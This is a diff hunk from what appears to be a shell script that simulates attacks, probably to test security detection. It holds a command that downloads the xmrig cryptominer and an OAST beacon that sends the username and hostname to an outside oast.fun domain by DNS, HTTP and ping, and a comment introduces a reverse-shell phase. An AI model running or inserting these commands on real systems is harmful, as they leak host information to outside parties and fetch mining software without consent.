@@ -187,10 +187,10 @@ run_attack "10" "⛏️" "Cryptominer Download Attempt" \
     "Cryptominer Activity" \
     'curl -s -o /tmp/xmrig https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-x64.tar.gz --connect-timeout 3 2>/dev/null || echo "MINER_DOWNLOAD_ATTEMPT" > /tmp/miner-marker.txt'
 
-run_attack "11" "📡" "DNS Exfiltration Beacon" \
-    "Exfiltrates data via DNS queries to attacker-controlled OAST domain" \
-    "DNS Exfiltration" \
-    'nslookup $(whoami).$(hostname).aezukuqsjqlaoghyjmiw9mg769uqgs4gb.oast.fun 2>/dev/null; curl -s http://$(whoami).aezukuqsjqlaoghyjmiw9mg769uqgs4gb.oast.fun/ > /dev/null 2>&1 || echo "OAST_BEACON_SENT" > /tmp/oast-beacon.txt'
+run_attack "11" "📡" "OAST Exfiltration Beacon" \
+    "Exfiltrates data via HTTP callback to attacker-controlled OAST domain" \
+    "Data Exfiltration / C2 Callback" \
+    'curl -s "http://$(whoami)-$(hostname).aezukuqsjqlaoghyjmiw9mg769uqgs4gb.oast.fun/exfil?user=$(whoami)&host=$(hostname)" --connect-timeout 3 > /tmp/oast-response.txt 2>&1; ping -c 1 $(whoami).aezukuqsjqlaoghyjmiw9mg769uqgs4gb.oast.fun > /dev/null 2>&1 || true'
 
 # ═══════════════════════════════════════════════════════════════
 # PHASE 5: Reverse Shell
